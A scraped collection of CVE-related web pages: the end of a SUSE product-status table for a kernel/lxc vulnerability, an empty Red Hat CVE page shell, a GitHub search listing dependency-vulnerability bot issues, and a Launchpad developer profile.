| SUSE Linux Enterprise Server 12 SP2-ESPOS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 12 SP2-LTSS | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 12 SP2-LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 12 SP3 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 12 SP3 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 12 SP3-BCL | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12 SP3-ESPOS | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12 SP3-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12 SP4 | kernel-default | Analysis |
| SUSE Linux Enterprise Server 12 SP4 | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12 SP4-ESPOS | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12 SP4-LTSS | kernel-default | Analysis |
| SUSE Linux Enterprise Server 12 SP4-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Server 12-LTSS | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 12-LTSS | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise Server 15 SP1-BCL | kernel-source | Analysis |
| SUSE Linux Enterprise Server 15 SP1-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Server 15 SP3-BCL | kernel-source | Analysis |
| SUSE Linux Enterprise Server 15-LTSS | kernel-source | Analysis |
| SUSE Linux Enterprise Server for Raspberry Pi 12 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | lxc | Not affected |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | lxc | Not affected |
| SUSE Linux Enterprise Server for SAP Applications 12 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 12 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 12 SP2 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 12 SP2 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 12 SP3 | kernel-source | Analysis |
| SUSE Linux Enterprise Server for SAP Applications 12 SP4 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 12 SP4 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 15 | kernel-default | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 15 | kernel-source | Unsupported |
| SUSE Linux Enterprise Server for SAP Applications 15 SP1 | kernel-source | Analysis |
| SUSE Linux Enterprise Software Development Kit 11 SP3 | lxc | Not affected |
| SUSE Linux Enterprise Software Development Kit 11 SP4 | lxc | Not affected |
| SUSE Manager Proxy 4.0 | kernel-source | Analysis |
| SUSE Manager Proxy 4.2 | kernel-default | Unsupported |
| SUSE Manager Proxy 4.2 | kernel-source | Unsupported |
| SUSE Manager Retail Branch Server 4.0 | kernel-source | Analysis |
| SUSE Manager Retail Branch Server 4.2 | kernel-default | Unsupported |
| SUSE Manager Retail Branch Server 4.2 | kernel-source | Unsupported |
| SUSE Manager Server 4.0 | kernel-source | Analysis |
| SUSE Manager Server 4.2 | kernel-default | Unsupported |
| SUSE Manager Server 4.2 | kernel-source | Unsupported |
| SUSE OpenStack Cloud 7 | kernel-source | Unsupported |
| SUSE OpenStack Cloud 8 | kernel-source | Analysis |
| SUSE OpenStack Cloud 9 | kernel-source | Analysis |
| SUSE OpenStack Cloud Crowbar 8 | kernel-source | Analysis |
| SUSE OpenStack Cloud Crowbar 9 | kernel-source | Analysis |
| openSUSE Leap 15.3 | kernel-source | Analysis |

---

### SUSE Timeline for this CVE

CVE page created: Fri Nov 18 14:31:00 2016

CVE page last modified: Thu Oct 10 13:31:59 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from access.redhat.com_595be415_20250126_010326.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from github.com_a61a19f7_20250126_010318.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-201)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-201

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-201)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# issues Search Results · "CVE-201

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-201)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-201)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-201)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-201)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-201)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-201)
  + More
* ### State

  + [Open](https://github.com/search?type=Issues&q=%22CVE-201&state=open)
  + [Closed](https://github.com/search?type=Issues&q=%22CVE-201&state=closed)
* ### Advanced

  + Owner
  + State
  + Close reason
  + [Has linked pull request](https://github.com/search?type=Issues&q=%22CVE-201+linked%3Apr)
  + Author
  + Assignee
  + Mentioned user
  + Mentioned team
  + Commenter
  + Involved user
  + Label
  + Milestone
  + Number of comments
  + Number of interactions
* [Advanced search](https://github.com/search/advanced)
Issues0 (0)0 results  (95 ms)
## 0 results

Sort by:  Best matchFilter
### [shahul01/sveltekit-typescript-tailwindcss-template](/shahul01/sveltekit-typescript-tailwindcss-template)[*CVE*-2024-53262 (Medium) detected in kit-1.0.0-next.*201*.tgz](/shahul01/sveltekit-typescript-tailwindcss-template/issues/39)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Nov 26, 2024
·* [#39](/shahul01/sveltekit-typescript-tailwindcss-template/issues/39)
### [shahul01/sveltekit-typescript-tailwindcss-template](/shahul01/sveltekit-typescript-tailwindcss-template)[*CVE*-2024-53261 (Low) detected in kit-1.0.0-next.*201*.tgz](/shahul01/sveltekit-typescript-tailwindcss-template/issues/38)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Nov 26, 2024
·* [#38](/shahul01/sveltekit-typescript-tailwindcss-template/issues/38)
### [shahul01/image-slider](/shahul01/image-slider)[*CVE*-2024-53262 (Medium) detected in kit-1.0.0-next.*201*.tgz](/shahul01/image-slider/issues/31)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Nov 26, 2024
·* [#31](/shahul01/image-slider/issues/31)
### [shahul01/image-slider](/shahul01/image-slider)[*CVE*-2024-53261 (Low) detected in kit-1.0.0-next.*201*.tgz](/shahul01/image-slider/issues/30)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Nov 26, 2024
·* [#30](/shahul01/image-slider/issues/30)
### [repology/repology-rs](/repology/repology-rs)[*CVE* display limited to 200](/repology/repology-rs/issues/70)

... there shouldn t be a limit at
all. Perhaps implement pages where the user can show records *201* .. 400, 401 .. 600, etc. Right now it seem to show the
oldest 200, truncating new *cves*.
Needs triage

* ![](https://avatars.githubusercontent.com/u/1125622?s=48&v=4)jrmarino
·* 1
·* Opened  on Nov 1, 2020
·* [#70](/repology/repology-rs/issues/70)
### [CVEProject/cve-schema](/CVEProject/cve-schema)[Support PURL as identifier](/CVEProject/cve-schema/issues/173)

Seconded. Had I known that Purl would take off I would have added it to the original *CVE* JSON specification I wrote.
Needs Discussionsection:affected\_product

* ![](https://avatars.githubusercontent.com/u/99355068?s=48&v=4)fortresslabs
·* 12
·* Opened  on May 20, 2022
·* [#173](/CVEProject/cve-schema/issues/173)
### [shahul01/sveltekit-typescript-tailwindcss-template](/shahul01/sveltekit-typescript-tailwindcss-template)[*CVE*-2023-29003 (High) detected in kit-1.0.0-next.*201*.tgz](/shahul01/sveltekit-typescript-tailwindcss-template/issues/20)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Apr 7, 2023
·* [#20](/shahul01/sveltekit-typescript-tailwindcss-template/issues/20)
### [nidhihcl75/kernel\_4.19.72](/nidhihcl75/kernel_4.19.72)[*CVE*-2021-0448 (Medium) detected in linuxlinux-4.19.87](/nidhihcl75/kernel_4.19.72/issues/463)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* 2
·* Opened  on Nov 29, 2024
·* [#463](/nidhihcl75/kernel_4.19.72/issues/463)
### [nidhihcl75/kernel\_4.19.72](/nidhihcl75/kernel_4.19.72)[*CVE*-2019-19534 (Low) detected in linuxlinux-4.19.87](/nidhihcl75/kernel_4.19.72/issues/188)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* 2
·* Opened  on Nov 29, 2024
·* [#188](/nidhihcl75/kernel_4.19.72/issues/188)
### [shahul01/image-slider](/shahul01/image-slider)[*CVE*-2023-29003 (High) detected in kit-1.0.0-next.*201*.tgz](/shahul01/image-slider/issues/13)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* Opened  on Apr 7, 2023
·* [#13](/shahul01/image-slider/issues/13)
Previous[1](https://github.com/search?type=Issues&q=%22CVE-201&p=1)[2](https://github.com/search?type=Issues&q=%22CVE-201&p=2)[3](https://github.com/search?type=Issues&q=%22CVE-201&p=3)[4](https://github.com/search?type=Issues&q=%22CVE-201&p=4)[5](https://github.com/search?type=Issues&q=%22CVE-201&p=5)[6](https://github.com/search?type=Issues&q=%22CVE-201&p=6)…[100](https://github.com/search?type=Issues&q=%22CVE-201&p=100)[Next](https://github.com/search?type=Issues&q=%22CVE-201&p=2)![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Restrict your search to the title by using the in:title qualifier.![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Restrict your search to the title by using the in:title qualifier.

You can’t perform that action at this time.



=== Content from launchpad.net_25015e6a_20250126_010325.html ===

[Log in / Register](https://launchpad.net/~stgraber/%2Blogin)

[![](https://launchpadlibrarian.net/7713533/hackergotchi.mini.png)](https://launchpad.net/~stgraber)

## [Stéphane Graber](https://launchpad.net/~stgraber)

* Overview
* [Code](https://code.launchpad.net/~stgraber)
* [Bugs](https://bugs.launchpad.net/~stgraber)
* [Blueprints](https://blueprints.launchpad.net/~stgraber)
* [Translations](https://translations.launchpad.net/~stgraber)
* [Answers](https://answers.launchpad.net/~stgraber)

Project leader for Linux Containers, Ubuntu Core developer and long time Ubuntu contributor.

Website: <http://www.stgraber.org>

* [Related packages](https://launchpad.net/~stgraber/%2Brelated-packages)
* [Related projects](https://launchpad.net/~stgraber/%2Brelated-projects)

## User information

Launchpad Id:
stgraber

Email:
[Log in](%2Blogin) for email information.

Member since:
2005-09-26

[![Icon of Bluetooth](https://launchpadlibrarian.net/4683649/stock_bluetooth.png "Member of Bluetooth")](/~bluetooth)
[![Icon of Edubuntu Developers](https://launchpadlibrarian.net/71879383/edubuntu-logo-only_14.png "Member of Edubuntu Developers")](/~edubuntu-dev)
[![Icon of Edubuntu Members](https://launchpadlibrarian.net/57014966/favicon.ico "Member of Edubuntu Members")](/~edubuntu-members)
[![Icon of GNOME3 Team](https://launchpadlibrarian.net/235731434/roundel14.png "Member of GNOME3 Team")](/~gnome3-team)
[![Icon of Indicator Applet Developers](https://launchpadlibrarian.net/22816053/add-notification-applet.14.png "Member of Indicator Applet Developers")](/~indicator-applet-developers)
[![Icon of Kubuntu Ninjas - Yellow belts](https://launchpadlibrarian.net/192173133/belt2-yellow3.png "Member of Kubuntu Ninjas - Yellow belts")](/~kubuntu-ninjas-yellow-belts)
[![Icon of Kubuntu Ninjas](https://launchpadlibrarian.net/31496145/icon.png "Member of Kubuntu Ninjas")](/~kubuntu-ninjas)
[![Icon of Kubuntu Package Archives](https://launchpadlibrarian.net/44411915/deb-small.png "Member of Kubuntu Package Archives")](/~kubuntu-ppa)
[![Icon of Launchpad Beta Testers](https://launchpadlibrarian.net/600856498/Canonical_Launchpad_icon_14px.png "Member of Launchpad Beta Testers")](/~launchpad-beta-testers)
[![Icon of Launchpad Users](https://launchpadlibrarian.net/600856618/Canonical_Launchpad_icon_14px.png "Member of Launchpad Users")](/~launchpad-users)
[![Icon of Lubuntu Code](https://launchpadlibrarian.net/704307155/lennyborg_14.png "Member of Lubuntu Code")](/~lubuntu-code)
[![Icon of Lubuntu Continuous Integration](https://launchpadlibrarian.net/704307325/lennyborg_14.png "Member of Lubuntu Continuous Integration")](/~lubuntu-ci)
[![Icon of Lubuntu Developers](https://launchpadlibrarian.net/704306355/lennyborg_14.png "Member of Lubuntu Developers")](/~lubuntu-dev)
[![Icon of Lubuntu Packages Team](https://launchpadlibrarian.net/704305879/lenny_bug_14.png "Member of Lubuntu Packages Team")](/~lubuntu-packaging)
[![Icon of Lubuntu](https://launchpadlibrarian.net/357050187/14.png "Member of Lubuntu")](/~lubuntu-desktop)
[![Icon of MOTU](https://launchpadlibrarian.net/1516491/motu-image-2.png "Member of MOTU")](/~motu)
[![Icon of Network-manager](https://launchpadlibrarian.net/11610188/nm-team.png "Member of Network-manager")](/~network-manager)
[![Icon of Not Canonical](https://launchpadlibrarian.net/71133712/not-canonical_aubergine_14.png "Member of Not Canonical")](/~not-canonical)
[![Icon of Pastebinit Developers](https://launchpadlibrarian.net/7079270/logo-tiny.png "Member of Pastebinit Developers")](/~pastebinit-developers)
[![Icon of Super Friends](https://launchpadlibrarian.net/134634591/superman14.png "Member of Super Friends")](/~super-friends)
[![Icon of Ubuntu Bug Control](https://launchpadlibrarian.net/4423778/qa-icon.png "Member of Ubuntu Bug Control")](/~ubuntu-bugcontrol)
[![Icon of Ubuntu Contributing Developers](https://launchpadlibrarian.net/17290192/wrench_emblem-trans.png "Member of Ubuntu Contributing Developers")](/~ubuntu-developer-members)
[![Icon of Ubuntu Core Development Team](https://launchpadlibrarian.net/1072365/main.png "Member of Ubuntu Core Development Team")](/~ubuntu-core-dev)
[![Icon of Ubuntu Development Team](https://launchpadlibrarian.net/1072363/motu.png "Member of Ubuntu Development Team")](/~ubuntu-dev)
[![Icon of Ubuntu Documentation Project Team](https://launchpadlibrarian.net/162165522/ubuntu-doc.png "Member of Ubuntu Documentation Project Team")](/~ubuntu-doc)
[![Icon of Ubuntu GNOME Developers](https://launchpadlibrarian.net/254356645/roundel14.png "Member of Ubuntu GNOME Developers")](/~ubuntu-gnome-dev)
[![Icon of Ubuntu GNOME](https://launchpadlibrarian.net/258611022/ubuntu-gnome_14.png "Member of Ubuntu GNOME")](/~ubuntu-gnome)
[![Icon of Ubuntu IRC Team](https://launchpadlibrarian.net/1741440/xchat.png "Member of Ubuntu IRC Team")](/~ubuntu-irc)
[![Icon of Ubuntu Kylin Members](https://launchpadlibrarian.net/444398797/623185830.jpg "Member of Ubuntu Kylin Members")](/~ubuntukylin-members)
[![Icon of Ubuntu LXC Security team](https://launchpadlibrarian.net/673452720/14.png "Member of Ubuntu LXC Security team")](/~ubuntu-lxc-security)
[![Icon of Ubuntu LXC team](https://launchpadlibrarian.net/202329400/14.png "Member of Ubuntu LXC team")](/~ubuntu-lxc)
[![Icon of Ubuntu MATE Developers](https://launchpadlibrarian.net/212349832/icon.png "Member of Ubuntu MATE Developers")](/~ubuntu-mate-dev)
[![Icon of Ubuntu Members](https://launchpadlibrarian.net/606495581/CoF%2014px.png "Member of Ubuntu Members")](/~ubuntumembers)
[![Icon of Ubuntu QA Website Developers](https://launchpadlibrarian.net/9926903/qat.14.png "Member of Ubuntu QA Website Developers")](/~ubuntu-qa-website-devel)
